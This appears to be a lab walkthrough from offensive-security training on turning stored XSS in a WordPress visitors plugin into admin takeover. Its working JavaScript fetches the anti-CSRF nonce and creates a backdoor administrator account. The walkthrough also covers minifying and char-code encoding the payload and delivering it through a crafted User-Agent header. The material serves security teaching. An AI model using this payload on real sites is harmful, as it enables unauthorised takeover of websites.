# Stored XSS to Admin Privilege Escalation — Exploitation Steps

## Step 0 — Recon: Rule Out Cookie Theft

**Why:** The simplest XSS payoff is stealing the admin's session cookie, so check if that's viable first. **What:** Inspect cookies (Storage tab → Cookies). WordPress session cookies show **HttpOnly = true**, meaning JavaScript is blocked from reading them. Cookie theft is dead, so pivot to making the admin's browser _perform an action_ instead of _leak a value_.

## Step 1 — Grab the Nonce

**Why:** State-changing WordPress actions require a nonce (anti-CSRF token) an attacker can't guess. But the XSS runs inside the admin's authenticated session, so it can just fetch the nonce legitimately and reuse it. **What:** Send a synchronous GET to the "add user" page, then regex the nonce value out of the HTML response.

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";     // page that contains the nonce
var nonceRegex = /ser" value="([^"]*?)"/g;     // capture value after ...ser" value="
ajaxRequest.open("GET", requestURL, false);    // false = synchronous, so nonce is ready before continuing
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];                      // extracted nonce
```

## Step 2 — Create the Backdoor Admin

**Why:** With a valid nonce and the admin's privileges, we can submit the create-user form to plant our own administrator account. **What:** POST the new-user parameters, injecting the harvested nonce and setting `role=administrator`.

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);     // submit the form request
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);                        // creates the attacker admin
```

## Step 3 — Minify

**Why:** The payload must fit on a single line to be embedded cleanly inside a `<script>` tag delivered via one HTTP header. **What:** Combine both functions and run them through **JSCompress** to collapse everything into one line.
```javascript
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

## Step 4 — Encode

**Why:** Raw JavaScript contains characters (quotes, ampersands, spaces) that can break the request or get mangled in transit. Encoding to numbers avoids all bad characters. **What:** Loop over the minified string and convert each character to its UTF-16 code, producing a comma-separated integer list.

```javascript
function encode_to_javascript(string) {
    var input = string;
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);         // char -> numeric code
        if(pos != (input.length - 1)) {
            output += ",";                        // comma-separate the codes
        }
    }
    return output;
}

let encoded = encode_to_javascript('insert_minified_javascript');
console.log(encoded);                            // run in browser console to get the array
```

## Step 5 — Deliver via Crafted Request

**Why:** The Visitors plugin logs the User-Agent header and later renders it in the admin dashboard, making it the perfect delivery point for stored XSS. **What:** Send a request whose User-Agent is a `<script>` that rebuilds the payload with `String.fromCharCode()` and executes it via `eval()`. `--proxy` routes it through Burp for inspection.

```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,...))</script>" --proxy 127.0.0.1:8080
```

## Step 6 — Forward in Burp

**Why:** Confirm the payload is well-formed before it lands in the database, and let it through to actually store it. **What:** With Intercept on, inspect the request, click **Forward**, then disable Intercept. The XSS is now stored in the WordPress database.

## Step 7 — Trigger and Confirm

**Why:** Stored XSS only fires when the victim loads the affected page, so simulate the admin doing so and verify the result. **What:** Log in as admin and open the **Visitors** dashboard to execute the script. A blank Browser/User-Agent field confirms it ran (the `<script>` executed rather than displaying). Check **Users** to confirm the new `attacker` account exists with the **Administrator** role.
